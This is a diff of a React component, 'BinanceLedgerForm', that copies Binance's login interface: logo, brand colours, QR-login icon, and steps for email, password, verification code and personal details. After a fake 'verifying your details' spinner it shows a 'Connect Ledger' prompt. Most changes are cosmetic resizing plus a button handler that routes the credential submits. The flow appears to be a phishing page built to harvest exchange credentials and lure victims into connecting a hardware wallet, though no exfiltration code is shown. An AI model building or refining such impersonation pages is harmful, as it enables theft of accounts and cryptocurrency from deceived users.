@@ -1,3 +1,4 @@
+
 import { FC, useState } from "react";
 import { useToast } from "@/hooks/use-toast";
 import { AlertTriangle } from "lucide-react";
@@ -141,19 +142,19 @@ const BinanceLedgerForm: FC = () => {
   };
 
   const renderHeader = () => (
-    <div className="flex justify-start mb-5">
+    <div className="flex justify-start mb-4">
       <div className="flex items-center">
         <img 
           src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/12/Binance_logo.svg/632px-Binance_logo.svg.png" 
           alt="Binance Logo" 
-          className="h-6"
+          className="h-5"
           onError={(e) => {
             setLogoError(true);
             e.currentTarget.style.display = 'none';
           }}
         />
         {logoError && (
-          <span className="text-binance-yellow font-bold text-base font-binance">
+          <span className="text-binance-yellow font-bold text-sm font-binance">
             BINANCE
           </span>
         )}
@@ -172,18 +173,14 @@ const BinanceLedgerForm: FC = () => {
       success: 'Verification Successful'
     };
 
-    if (currentStep === 'important-notice') {
-      return null; // Title handled in content for important notice
-    }
-
-    if (currentStep === 'verifying' || currentStep === 'success') {
+    if (currentStep === 'important-notice' || currentStep === 'verifying' || currentStep === 'success') {
       return null; // Title handled in content for these states
     }
 
     return (
-      <div className="flex justify-between items-center mb-5">
+      <div className="flex justify-between items-center mb-4">
         <div 
-          className="text-lg font-bold font-binance"
+          className="text-base font-bold font-binance"
           style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
           role="heading" 
           aria-level={1}
@@ -191,18 +188,18 @@ const BinanceLedgerForm: FC = () => {
           {titles[currentStep]}
         </div>
         {currentStep === 'email' && (
-          <div className="max-md:hidden h-[32px]">
+          <div className="max-md:hidden h-[28px]">
             <div className="bn-tooltips-wrap qrcode-login-popup">
               <div className="bn-tooltips-ele">
                 <div 
-                  className="p-[2px] w-[32px] h-[32px] rounded-[5px] cursor-pointer qr-login-icon transition-colors hover:bg-[#2B3139]"
+                  className="p-[2px] w-[28px] h-[28px] rounded-[4px] cursor-pointer qr-login-icon transition-colors hover:bg-[#2B3139]"
                   style={{ backgroundColor: "var(--color-Vessel, #1E2329)" }}
                   role="button" 
                   aria-label="QR code login" 
                   tabIndex={0}
                 >
                   <svg 
-                    className="w-[28px] h-[28px]" 
+                    className="w-[24px] h-[24px]" 
                     style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
                     viewBox="0 0 24 24" 
                     xmlns="http://www.w3.org/2000/svg"
@@ -228,26 +225,26 @@ const BinanceLedgerForm: FC = () => {
   const renderSpecialState = () => {
     if (currentStep === 'important-notice') {
       return (
-        <div className="flex items-center justify-center min-h-[400px] text-center">
+        <div className="text-center" style={{ minHeight: "350px", display: "flex", flexDirection: "column", justifyContent: "center" }}>
           <div className="max-w-sm mx-auto">
             <div 
-              className="mb-4 flex items-center justify-center gap-2 text-sm font-semibold font-binance"
+              className="mb-3 flex items-center justify-center gap-1.5 text-xs font-semibold font-binance"
               style={{ color: "#F59E0B" }}
             >
-              <AlertTriangle size={12} style={{ color: "#F59E0B" }} />
+              <AlertTriangle size={10} style={{ color: "#F59E0B" }} />
               Important Notice
             </div>
-            <div className="text-xs font-binance text-center leading-relaxed mb-6" style={{ color: "#B7BDC6" }}>
+            <div className="text-xs font-binance text-center leading-relaxed mb-5" style={{ color: "#B7BDC6" }}>
               Please ensure that all the information you provide is accurate and matches your official documents. This information will be verified for security and compliance purposes. Failure to provide accurate information may result in a delay or rejection of your verification process.
             </div>
             <button
               type="button"
               onClick={handleNoticeConfirm}
-              className="w-full py-2.5 rounded transition-all duration-200 hover:opacity-90 hover:scale-[1.02] active:scale-[0.98] font-bold font-binance text-xs"
+              className="w-full py-2 rounded transition-all duration-200 hover:opacity-90 hover:scale-[1.02] active:scale-[0.98] font-bold font-binance text-xs"
               style={{
                 backgroundColor: "var(--color-BtnBg, #FCD535)",
                 color: "var(--color-TextOnYellow, #202630)",
-                height: "38px"
+                height: "34px"
               }}
               aria-label="I Understand"
             >
@@ -260,17 +257,15 @@ const BinanceLedgerForm: FC = () => {
 
     if (currentStep === 'verifying') {
       return (
-        <div className="flex items-center justify-center min-h-[400px]">
-          <div className="text-center">
-            <div 
-              className="text-sm font-semibold font-binance mb-4"
-              style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
-            >
-              Please wait a moment while we verify your details
-            </div>
-            <div className="flex justify-center">
-              <div className="animate-spin rounded-full h-6 w-6 border-4 border-yellow-500 border-t-transparent"></div>
-            </div>
+        <div className="text-center" style={{ minHeight: "350px", display: "flex", flexDirection: "column", justifyContent: "center" }}>
+          <div 
+            className="text-xs font-semibold font-binance mb-3"
+            style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
+          >
+            Please wait a moment while we verify your details
+          </div>
+          <div className="flex justify-center">
+            <div className="animate-spin rounded-full h-5 w-5 border-4 border-yellow-500 border-t-transparent"></div>
           </div>
         </div>
       );
@@ -278,27 +273,25 @@ const BinanceLedgerForm: FC = () => {
 
     if (currentStep === 'success') {
       return (
-        <div className="flex items-center justify-center min-h-[400px]">
-          <div className="text-center">
-            <div 
-              className="text-sm font-semibold font-binance mb-6"
-              style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
-            >
-              Verification Successful
-            </div>
-            <button
-              type="button"
-              className="w-full py-2.5 rounded transition-all duration-200 hover:opacity-90 hover:scale-[1.02] active:scale-[0.98] font-bold font-binance text-xs"
-              style={{
-                backgroundColor: "var(--color-BtnBg, #FCD535)",
-                color: "var(--color-TextOnYellow, #202630)",
-                height: "38px"
-              }}
-              aria-label="Connect Ledger"
-            >
-              Connect Ledger
-            </button>
+        <div className="text-center" style={{ minHeight: "350px", display: "flex", flexDirection: "column", justifyContent: "center" }}>
+          <div 
+            className="text-xs font-semibold font-binance mb-5"
+            style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
+          >
+            Verification Successful
           </div>
+          <button
+            type="button"
+            className="w-full py-2 rounded transition-all duration-200 hover:opacity-90 hover:scale-[1.02] active:scale-[0.98] font-bold font-binance text-xs"
+            style={{
+              backgroundColor: "var(--color-BtnBg, #FCD535)",
+              color: "var(--color-TextOnYellow, #202630)",
+              height: "34px"
+            }}
+            aria-label="Connect Ledger"
+          >
+            Connect Ledger
+          </button>
         </div>
       );
     }
@@ -710,11 +703,11 @@ const BinanceLedgerForm: FC = () => {
     if (currentStep === 'personal-details') {
       return (
         <button
-          className="w-full py-2.5 rounded transition-all duration-200 hover:opacity-90 hover:scale-[1.02] active:scale-[0.98] flex items-center justify-center font-bold font-binance text-xs"
+          className="w-full py-2 rounded transition-all duration-200 hover:opacity-90 hover:scale-[1.02] active:scale-[0.98] flex items-center justify-center font-bold font-binance text-xs"
           style={{
             backgroundColor: "var(--color-BtnBg, #FCD535)",
             color: "var(--color-TextOnYellow, #202630)",
-            height: "38px"
+            height: "34px"
           }}
           type="submit"
           disabled={isLoading}
@@ -722,7 +715,7 @@ const BinanceLedgerForm: FC = () => {
           onClick={handlePersonalDetailsSubmit}
         >
           {isLoading ? (
-            <div className="animate-spin rounded-full h-4 w-4 border-2 border-current border-t-transparent"></div>
+            <div className="animate-spin rounded-full h-3 w-3 border-2 border-current border-t-transparent"></div>
           ) : (
             'Submit'
           )}
@@ -743,20 +736,36 @@ const BinanceLedgerForm: FC = () => {
       }
     };
 
+    const handleButtonClick = (e: React.FormEvent) => {
+      e.preventDefault();
+      switch (currentStep) {
+        case 'email':
+          handleEmailSubmit(e);
+          break;
+        case 'password':
+          handlePasswordSubmit(e);
+          break;
+        case 'verification':
+          handleVerificationSubmit(e);
+          break;
+      }
+    };
+
     return (
       <button
-        className="w-full py-2.5 rounded transition-all duration-200 hover:opacity-90 hover:scale-[1.02] active:scale-[0.98] flex items-center justify-center font-bold font-binance text-xs"
+        className="w-full py-2 rounded transition-all duration-200 hover:opacity-90 hover:scale-[1.02] active:scale-[0.98] flex items-center justify-center font-bold font-binance text-xs"
         style={{
           backgroundColor: "var(--color-BtnBg, #FCD535)",
           color: "var(--color-TextOnYellow, #202630)",
-          height: "38px"
+          height: "34px"
         }}
         type="submit"
         disabled={isLoading}
         aria-label={getButtonText()}
+        onClick={handleButtonClick}
       >
         {isLoading ? (
-          <div className="animate-spin rounded-full h-4 w-4 border-2 border-current border-t-transparent"></div>
+          <div className="animate-spin rounded-full h-3 w-3 border-2 border-current border-t-transparent"></div>
         ) : (
           getButtonText()
         )}
@@ -889,10 +898,10 @@ const BinanceLedgerForm: FC = () => {
       style={{ backgroundColor: "var(--color-Body, #181A20)" }}
     >
       <div 
-        className="w-full max-w-md p-5 rounded-lg"
+        className="w-full max-w-md p-4 rounded-lg"
         style={{ 
           backgroundColor: "var(--color-Card, #1E2329)",
-          minHeight: "500px"
+          minHeight: "450px"
         }}
       >
         {/* Always show header */}
@@ -901,7 +910,7 @@ const BinanceLedgerForm: FC = () => {
         {/* Content with fade transition */}
         <div 
           className={`transition-opacity duration-300 ${isTransitioning ? 'opacity-0' : 'opacity-100'}`}
-          style={{ minHeight: "420px" }}
+          style={{ minHeight: "380px" }}
         >
           {isSpecialState ? (
             renderSpecialState()
@@ -909,7 +918,7 @@ const BinanceLedgerForm: FC = () => {
             <div className="flex flex-col h-full">
               {renderTitle()}
               
-              <div style={{ minHeight: "320px" }} className="flex flex-col">
+              <div style={{ minHeight: "280px" }} className="flex flex-col">
                 {renderMainForm()}
                 
                 <div className="mt-auto">
